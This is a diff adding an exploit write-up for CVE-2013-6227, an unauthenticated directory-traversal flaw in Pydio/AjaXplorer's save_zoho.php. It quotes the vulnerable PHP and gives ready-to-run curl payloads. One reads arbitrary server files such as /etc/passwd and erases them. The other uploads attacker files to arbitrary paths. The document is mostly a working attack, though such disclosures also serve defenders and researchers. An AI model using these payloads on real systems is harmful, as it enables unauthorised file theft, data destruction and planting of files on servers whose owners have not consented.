@@ -1,0 +1,54 @@
+# Exploit Title: Unauthenticated Arbitrary File Upload Vulnerability In Pydio/AjaXplorer 5.0.3 – 3.3.5
+# Date: 01/18/2019
+# Exploit Author: @_jazz______
+# Vendor Homepage: https://pydio.com/
+# Software Link: https://sourceforge.net/projects/ajaxplorer/files/ajaxplorer/stable-channel/4.2.3/ajaxplorer-core-4.2.3.tar.gz/download
+# Version: ajaXplorer before 5.0.4
+# Tested on: ajaXplorer 4.2.3 on Debian 9 update 5
+# References: https://web.archive.org/web/20140430075145/http://www.redfsec.com/CVE-2013-6227
+# CVE: CVE-2013-6227
+###########################################################################################
+Affected file:
+/plugins/editor.zoho/agent/save_zoho.php
+
+<?php
+  
+  $vars = array_merge($_GET, $_POST);
+  
+  if(!isSet($vars["ajxp_action"]) && isset($vars["id"]) && isset($vars["format"])){
+    $filezoho = $_FILES['content']["tmp_name"];
+    $cleanId = str_replace(array("..", "/"), "", $vars["id"]);
+    move_uploaded_file($filezoho, "files/".$cleanId.".".$vars["format"]);
+ }else if($vars["ajxp_action"] == "get_file" && isSet($vars["name"])){
+    if(file_exists("files/".$vars["name"])){
+      readfile("files/".$vars["name"]);
+      unlink("files/".$vars["name"]);
+    }
+  }
+  
+?>
+
+Option 1: If "ajxp_action" is not set, upload "content" file to files/id.format. 
+The code does not sanitize "format" parameter before passing it as an argument to "move_uploaded_file",
+thus introducing an opportunity to upload files to any arbitrary location via directory traversal 
+Note: User should have permission to write on the desired location.
+
+Option 2: If "ajxp_action" is set to "get_file", read the file from "files/name" and then ERASE IT (unlink). 
+Again, the code does not sanitize the "name" parameter, making it also vulnerable to directory traversal.
+
+"files" directory's location is by default /plugins/editor.zoho/agent/files
+A default location for reading/uploading files is /data/files/
+###########################################################################################
+
+[1] [CAUTION!] Read arbitrary files 
+curl "http://<url>/<ajaxplorer_wwwroot>/plugins/editor.zoho/agent/save_zoho.php?ajxp_action=get_file&name=<file_relative_path>"
+
+e.g. curl "http://muralito.el.payaso/ajaxplorer/plugins/editor.zoho/agent/save_zoho.php?ajxp_action=get_file&name=../../../../../../../../etc/passwd"
+
+[USE WITH CAUTION] This is a destructive function. Files retrieved WILL be erased after reading, provided that the file is writable by the user which the web server's process is running as.
+
+[2] Arbitrary File Upload
+*step 1 - Upload the file to the server* 
+# curl -F 'content=@<filename_from_attacker_host>;type=<filetype>;filename=\"<filename>\"' "http://<url>/<ajaxplorer_wwwroot>/plugins/editor.zoho/agent/save_zoho.php?id=&format=<upload_to_file_relative_path>"
+
+e.g. # curl -F 'content=@test.html;type=text/html;filename=\"test.html\"' "http://muralito.el.payaso/ajaxplorer/plugins/editor.zoho/agent/save_zoho.php?id=&format=./../../../data/files/test.html"
